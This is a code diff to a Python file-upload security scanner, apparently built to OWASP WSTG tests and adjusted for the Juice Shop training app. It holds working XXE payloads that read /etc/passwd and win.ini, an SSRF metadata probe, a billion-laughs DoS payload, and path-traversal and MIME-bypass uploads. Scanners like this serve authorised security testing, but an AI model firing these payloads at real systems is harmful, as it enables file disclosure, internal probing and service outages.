@@ -14,6 +14,12 @@ import base64
 from typing import Optional, Dict, List, Any
 from pathlib import Path
 
+UPLOAD_SUCCESS_STATUSES = {200, 201, 204}
+
+
+def is_upload_success_status(status_code: int) -> bool:
+    return status_code in UPLOAD_SUCCESS_STATUSES
+
 
 # ============================================================================
 # OWASP WSTG-BUSL-08: Test Upload of Unexpected File Types
@@ -57,7 +63,7 @@ async def test_unrestricted_upload(
                 resp = await client.post(url, files=files, headers=headers)
                 
                 # Check if upload succeeded
-                if resp.status_code in [200, 201]:
+                if is_upload_success_status(resp.status_code):
                     # Try to find uploaded file URL in response
                     upload_url = _extract_upload_url(resp.text, filename)
                     
@@ -81,7 +87,7 @@ async def test_unrestricted_upload(
                             "extension": ext,
                             "filename": filename,
                             "severity": "high",
-                            "evidence": resp.text[:200],
+                            "evidence": f"HTTP {resp.status_code}: {resp.text[:200]}",
                             "description": f"File type {ext} was accepted (HTTP {resp.status_code})"
                         })
                         
@@ -138,7 +144,7 @@ async def test_path_traversal_upload(
                 files = {file_param: (filename, content, "text/plain")}
                 resp = await client.post(url, files=files, headers=headers)
                 
-                if resp.status_code in [200, 201]:
+                if is_upload_success_status(resp.status_code):
                     # Check if server processed the malicious filename
                     if filename in resp.text or "passwd" in resp.text or "win.ini" in resp.text:
                         findings.append({
@@ -197,23 +203,37 @@ async def test_xxe_via_svg(
     findings = []
     
     xxe_payloads = [
-        # Local file disclosure
+        # Local file disclosure via SVG
         ("""<?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE svg [
   <!ENTITY xxe SYSTEM "file:///etc/passwd">
 ]>
 <svg xmlns="http://www.w3.org/2000/svg" width="100" height="100">
   <text x="10" y="20">&xxe;</text>
-</svg>""", "file_disclosure_etc_passwd"),
+</svg>""", "file_disclosure_etc_passwd", "svg", "image/svg+xml"),
         
-        # Windows file disclosure
+        # Windows file disclosure via SVG
         ("""<?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE svg [
   <!ENTITY xxe SYSTEM "file:///C:/windows/win.ini">
 ]>
 <svg xmlns="http://www.w3.org/2000/svg" width="100" height="100">
   <text x="10" y="20">&xxe;</text>
-</svg>""", "file_disclosure_win_ini"),
+</svg>""", "file_disclosure_win_ini", "svg", "image/svg+xml"),
+
+        # Juice Shop B2B/complaint XML parser path
+        ("""<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE foo [<!ELEMENT foo ANY>
+  <!ENTITY xxe SYSTEM "file:///etc/passwd">
+]>
+<trades>
+  <metadata>
+    <name>Apple Juice</name>
+    <trader><foo>&xxe;</foo><name>B. Kimminich</name></trader>
+    <units>1500</units>
+    <price>106</price>
+  </metadata>
+</trades>""", "juice_shop_b2b_etc_passwd", "xml", "application/xml"),
         
         # SSRF attempt (internal network scan)
         ("""<?xml version="1.0" encoding="UTF-8"?>
@@ -222,7 +242,7 @@ async def test_xxe_via_svg(
 ]>
 <svg xmlns="http://www.w3.org/2000/svg" width="100" height="100">
   <text x="10" y="20">&xxe;</text>
-</svg>""", "ssrf_metadata_endpoint"),
+</svg>""", "ssrf_metadata_endpoint", "svg", "image/svg+xml"),
         
         # Billion laughs attack (DoS)
         ("""<?xml version="1.0"?>
@@ -233,22 +253,22 @@ async def test_xxe_via_svg(
 ]>
 <svg xmlns="http://www.w3.org/2000/svg">
   <text>&lol3;</text>
-</svg>""", "billion_laughs_dos"),
+</svg>""", "billion_laughs_dos", "svg", "image/svg+xml"),
     ]
     
     headers = _build_headers(auth_session)
     
     async with httpx.AsyncClient(timeout=30.0, follow_redirects=True) as client:
-        for payload, attack_type in xxe_payloads:
-            filename = f"malicious_{attack_type}.svg"
+        for payload, attack_type, extension, mime_type in xxe_payloads:
+            filename = f"malicious_{attack_type}.{extension}"
             
             try:
-                files = {file_param: (filename, payload, "image/svg+xml")}
+                files = {file_param: (filename, payload, mime_type)}
                 resp = await asyncio.wait_for(
                     client.post(url, files=files, headers=headers), timeout=10.0
                 )
 
-                if resp.status_code in [200, 201]:
+                if is_upload_success_status(resp.status_code) or resp.status_code >= 400:
                     # Check for file content disclosure
                     if "root:" in resp.text or "daemon:" in resp.text:
                         findings.append({
@@ -309,6 +329,15 @@ async def test_xxe_via_svg(
                                 "evidence": "SVG file uploaded and processed",
                                 "description": "SVG upload may be vulnerable to XXE"
                             })
+                    elif is_upload_success_status(resp.status_code) and extension == "xml":
+                        findings.append({
+                            "type": "xxe_xml_upload_accepted",
+                            "attack_type": attack_type,
+                            "filename": filename,
+                            "severity": "medium",
+                            "evidence": f"XML upload accepted with HTTP {resp.status_code}",
+                            "description": "XML upload accepted on file-upload endpoint; parser path should be reviewed for XXE"
+                        })
                         
             except Exception as e:
                 pass
@@ -373,7 +402,7 @@ async def test_mime_type_bypass(
                 files = {file_param: (filename, content, mime_type)}
                 resp = await client.post(url, files=files, headers=headers)
                 
-                if resp.status_code in [200, 201]:
+                if is_upload_success_status(resp.status_code):
                     upload_url = _extract_upload_url(resp.text, filename)
                     
                     if upload_url:
@@ -404,6 +433,15 @@ async def test_mime_type_bypass(
                                     "evidence": f"File accessible at {upload_url}",
                                     "description": f"MIME bypass successful using {technique}"
                                 })
+                    else:
+                        findings.append({
+                            "type": "mime_bypass_accepted",
+                            "filename": filename,
+                            "technique": technique,
+                            "severity": "high",
+                            "evidence": f"Upload accepted with HTTP {resp.status_code}",
+                            "description": f"MIME bypass accepted using {technique}"
+                        })
                         
             except Exception as e:
                 pass
@@ -441,19 +479,19 @@ async def test_upload_size_limit(
     headers = _build_headers(auth_session)
     
     async with httpx.AsyncClient(timeout=60.0, follow_redirects=True) as client:
-        # Test 1: Large file (10MB - reduced for faster testing)
+        # Test 1: Juice Shop accepts >100KB and <200KB PDF via /file-upload with HTTP 204.
         try:
-            large_content = "A" * (10 * 1024 * 1024)  # 10MB
-            files = {file_param: ("large_file.txt", large_content, "text/plain")}
+            large_content = b"%PDF-1.4\n" + (b"A" * (150 * 1024))
+            files = {file_param: ("large_file.pdf", large_content, "application/pdf")}
             resp = await client.post(url, files=files, headers=headers)
             
-            if resp.status_code in [200, 201]:
+            if is_upload_success_status(resp.status_code):
                 findings.append({
                     "type": "no_size_limit",
-                    "file_size": "10MB",
+                    "file_size": "150KB",
                     "severity": "medium",
-                    "evidence": f"Uploaded 10MB file successfully (HTTP {resp.status_code})",
-                    "description": "Server accepts large files without size validation"
+                    "evidence": f"Uploaded >100KB PDF successfully (HTTP {resp.status_code})",
+                    "description": "Server accepts a file larger than the documented client-side upload size limit"
                 })
         except Exception as e:
             # Timeout or rejection is expected (good security)
@@ -461,18 +499,18 @@ async def test_upload_size_limit(
         
         # Test 2: Check for size limit error messages
         try:
-            huge_content = "B" * (100 * 1024 * 1024)  # 100MB
-            files = {file_param: ("huge_file.txt", huge_content, "text/plain")}
+            huge_content = b"%PDF-1.4\n" + (b"B" * (250 * 1024))
+            files = {file_param: ("huge_file.pdf", huge_content, "application/pdf")}
             resp = await client.post(url, files=files, headers=headers, timeout=10.0)
             
             # If this succeeds, it's a critical vulnerability
-            if resp.status_code in [200, 201]:
+            if is_upload_success_status(resp.status_code):
                 findings.append({
                     "type": "no_size_limit_critical",
-                    "file_size": "100MB",
+                    "file_size": "250KB",
                     "severity": "high",
-                    "evidence": f"Uploaded 100MB file successfully (HTTP {resp.status_code})",
-                    "description": "Server accepts very large files (DoS risk)"
+                    "evidence": f"Uploaded >200KB file successfully (HTTP {resp.status_code})",
+                    "description": "Server accepts files larger than the documented server-side limit"
                 })
         except httpx.TimeoutException:
             # Timeout is actually good (server might be processing)
